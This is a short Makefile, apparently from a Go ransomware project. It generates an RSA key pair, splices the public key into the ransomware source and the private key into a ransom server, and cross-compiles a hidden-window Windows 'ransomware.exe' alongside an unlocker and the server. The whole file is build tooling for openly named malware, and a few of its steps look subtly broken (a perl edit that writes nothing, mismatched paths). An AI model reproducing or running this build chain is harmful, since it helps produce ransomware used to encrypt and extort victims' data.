.PHONY: all

all: build clean

pre-build:
	mkdir -p build
	openssl genrsa -out build/private.pem 2048
	openssl rsa -in build/private.pem -outform PEM -pubout -out build/public.pem
	rsrc -manifest ransomware.manifest -ico icon.ico -o build/ransomware.syso
	cp cmd/ransomware/ransomware.go ./build
	cp cmd/unlocker/unlocker.go ./build
	perl -e 's/INJECT_PUB_KEY_HERE/`echo -n "\n"; cat public.pem`/e' ransomware.go
	perl -pi.bak -e 's/INJECT_PRIV_KEY_HERE/`echo -n "\n"; cat private.pem`/e' server/main.go
	mkdir -p bin

ransomware:
	cd build && env GOOS=windows go build -ldflags="-H windowsgui" ransomware.go && mv ransomware.exe ../bin

unlocker:
	cd build && env GOOS=windows go build unlocker.go && mv unlocker.exe bin

server:
	cd server && go build && mv `ls|grep server` ../bin

build: pre-build ransomware unlocker server

clean:
	rm -r build ransomware.syso
	mv server/main.go.bak server/main.go
